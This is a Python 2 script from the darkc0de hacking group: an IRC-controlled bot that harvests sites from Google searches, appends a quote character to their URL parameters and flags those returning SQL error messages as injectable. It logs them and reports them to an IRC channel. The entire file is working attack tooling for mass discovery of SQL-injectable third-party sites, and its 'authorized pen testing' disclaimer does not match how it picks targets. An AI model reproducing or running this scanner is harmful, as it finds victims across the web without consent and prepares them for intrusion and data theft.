#!/usr/bin/env python
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
# SQLi Error Scanner /w Google Search

# darkc0de Crew 
# www.darkc0de.com 
# rsauron[at]gmail[dot]com

# Greetz to 
# d3hydr8, P47r1ck, Tarsian, c0mr@d, reverenddigitalx, beenu, baltazar, C1c4Tr1Z, Well0ne
# and the rest of the Darkc0de members

# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# Intended for authorized Web Application Pen Testing!

import sys, socket, re, string, urllib2, sets, random, time, threading

if len(sys.argv) != 5:
	print "Usage: ./sqlifinderb0t.py <host> <port> <nick> <channel>"
	sys.exit(1)

agents = ["Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
	"Microsoft Internet Explorer/4.0b1 (Windows 95)",
	"Opera/8.00 (Windows NT 5.1; U; en)"]

langs = ["en", "it", "nl", "ru", "ua", "pl", "de", "be", "kr", "fr", "es", "se", "no", "ir", "za"]
sites=[]
tba=[]
threads =[]
numthreads = 1
verbose = 0
#---------------------------------------------------------
#Edit what you want added to the address.
EXT = "'" 

#Edit what you want to search for.
MATCH = "error in your SQL syntax"
#---------------------------------------------------------

def getsites(lang):
	try:
                page_counter=0
    		while page_counter < int(arg_page_end):
                        s.send("PONG %s\r\n" % line[1]) 
			time.sleep(3)
                        results_web = 'http://www.google.com/search?q='+str(query)+'&hl='+str(lang)+'&lr=&ie=UTF-8&start='+repr(page_counter)+'&sa=N'
        		request_web = urllib2.Request(results_web)
        		request_web.add_header('User-Agent',random.choice(agents))
        		opener_web = urllib2.build_opener()
        		text = opener_web.open(request_web).read()
                        if re.search("403 Forbidden", text):
                                s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[-] Received Captcha... Damn that sucks!"))
                                break
        		names = re.findall(('<cite>+[\w\d\?\/\.\=\s\-]+=+[\d]+[\w\d\?\/\.\=\s\-]+</cite>'),text.replace("<b>","").replace("</b>",""))
        		for name in names:
				name = re.sub(" - \d+k - </cite>","",name.replace("<cite>","")).replace("</cite>","")
				name = name.rstrip(" -")
				sites.append(name)
        		page_counter +=10
                                
	except IOError:
		s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[-] Can't connect to Google Web!"))

def parse_urls(links):
	urls = []
	for link in links: 
		num = link.count("=")
		if num > 0:
			for x in xrange(num):
				link = link.rsplit(('=+[\d]'),x+1)[0]
				urls.append(link+EXT)
	urls = list(sets.Set(urls))
	return urls
 
def test(host):
        socket.setdefaulttimeout(5)
        if int(verbose) == 1:
                s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[+] Testing:", host))
	try:
                if host[:7] != "http://":
                        host = "http://"+host
		source = urllib2.urlopen(host).read()
		if re.search(MATCH, source): 
			s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[!] Found:", host))
                        file = open("foundsqli.txt", "a")
                        file.write("\n[!] Found: "+host)
                        file.close()
		else:
                        if int(verbose) == 1:
                                s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[-] Not Vuln:", host))
        except(socket.gaierror, socket.timeout, socket.error), msg:
                        s.send("PRIVMSG %s :%s%s @ %s\r\n" % (CHAN, "[-] Error: ",msg, host))
	except:
		pass 

class TestThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                threading.Thread.__init__(self)
        
        def run (self):
                urls = parse_urls(self.hosts)
                for url in urls: 
                        try:
                                test(url.replace("\n",""))
                        except(KeyboardInterrupt):
                                pass
                file = open("sqlitested.txt", "a")
                for tbw in self.hosts:
                        file.write(tbw+"\n")
                file.close()
                self.fcount+=1

PASS = ""
HOST = sys.argv[1]
PORT = int(sys.argv[2])
NICK = sys.argv[3]
CHAN = sys.argv[4]
if len(sys.argv) == 6:
        PASS = sys.argv[5]
readbuffer = ""
s=socket.socket( )
s.connect((HOST, PORT))
s.send("NICK %s\r\n" % NICK)
s.send("USER %s %s bla :%s\r\n" % (NICK, NICK, NICK))
s.send("JOIN :%s %s\r\n" % (CHAN, PASS))

while 1:
	readbuffer=readbuffer+s.recv(1024)
    	temp=string.split(readbuffer, "\n")
    	readbuffer=temp.pop( )
    	for line in temp:
        	line=string.rstrip(line)
        	line=string.split(line)
                try:
			if line[1] == "JOIN":
				name = str(line[0].split("!")[0])
				s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "Welcome, ", name.replace(":","")))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|----------------------------|"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|  rsauron[at]gmail[dot]com     v1.0"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|   8/2008 SQLi Finder Bot"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|   - Scans Sites for SQLi errors"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|   - Retreives Targets from Google"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|   - Stores logs of Found and Tested"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|   - Multi-Threading Scanning! - WOW"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|   type !help - for help             "))     
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "|----------------------------|"))
			if line[3] == ":!help":
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] Displaying list of commands the bot understands"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !status - Shows status of b0t!"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !clear  - Clears the hosts in the testing array!!"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !search - Gets sites to test! ex. !search <query> <lang> <EndPage>"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !show   - Show list of sites to be tested!"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !test - Preform Test on sites in testing array!"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !langs - Shows a list a of langs that can be used for search function!"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !threads - Set the number of threads to be used in testing..  default is 1!"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !verbose - Verbosity ON = 1 - Verbosity OFF = 0 - Default is OFF"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] !die - Kills b0t!"))
			if line[3] == ":!langs":
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] These are just some langs you could use...!"))
                                for lang in langs:
        				s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[+] ",lang))
			if line[3] == ":!die":
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[-] b0t dying... vist darkc0de.com!!"))
				sys.exit(1)
			if line[3] == ":!search":
				query = line[4]
				lang = line[5]
				arg_page_end = line[6]
				s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[+] Query: ", query))
				s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[+] Language: ", lang))
				s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[+] Search ends: ", arg_page_end))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] Starting search..."))
                                getsites(lang)
                                sites = list(sets.Set(sites))
                                testedfile = open("sqlitested.txt", "r")
                                testedsites = testedfile.read()
                                testedfile.close()
                                if testedsites.endswith("\n"):
                                        testedsites = testedsites.rstrip("\n")
                                testedsites = testedsites.split("\n")
                                s1 = set(sites)
                                s2 = set(testedsites)
                                tba = list(s1.difference(s2))
				s.send("PRIVMSG %s :%s%s%s\r\n" % (CHAN, "[+] Found ", len(tba), " sites to test!"))
                        if line[3] == ":!clear":
                                tba=[]
                                sites=[]
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[-] Testing array cleared..."))
			if line[3] == ":!status":
				s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[+] Number of sites loaded in testing array: ", len(tba)))
				s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[+] Number of threads set for scanning: ", numthreads))
                                masterthread = 0
                                if threads != []:
                                        for thread in threads:
                                                masterthread+=thread.fcount
                                        s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[+] Number of threads finished scanning: ", masterthread))
                                if int(verbose) == 1:
                                        s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] Verbosity Set ON!"))
                                if int(verbose) == 0:
                                        s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] Verbosity Set OFF!"))
                                        
			if line[3] == ":!show":
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] Showing sites to be tested..."))
				if len(tba) < 50:
                                        for site in tba:
                                                s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[+] ", site))
                                else:
                                        s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[-] More then 50 sites in list... Just to many hosts to print to term! sry!"))
				s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] Done!"))
			if line[3] == ":!threads":
                                numthreads = line[4]
				s.send("PRIVMSG %s :%s%s\r\n" % (CHAN, "[+] Number of threads set for testing: ", numthreads))
			if line[3] == ":!verbose":
                                verbose = line[4]
                                if int(verbose) == 1:
                                        s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] Verbosity Set ON!"))
                                if int(verbose) == 0:
                                        s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[+] Verbosity Set OFF!"))
                        if line[3] == ":!test":
                                if tba == 0:
                                        s.send("PRIVMSG %s :%s\r\n" % (CHAN, "[-] No sites to test..."))
                                else:
                                        s.send("PRIVMSG %s :%s%s%s\r\n" % (CHAN, "[+] Beginning test of ", len(tba), " sites!"))
                                        threads=[]
                                        i = len(tba) / int(numthreads)
                                        for x in range(0, int(numthreads)):
                                                if (x-1) == int(numthreads):
                                                        sliced = tba[x*i:]
                                                else:
                                                        sliced = tba[x*i:(x+1)*i]
                                                thread = TestThread(sliced)
                                                thread.start()
                                                threads.append(thread)

                except(IndexError):
                        pass
	
                if(line[0]=="PING"):
          		s.send("PONG %s\r\n" % line[1])
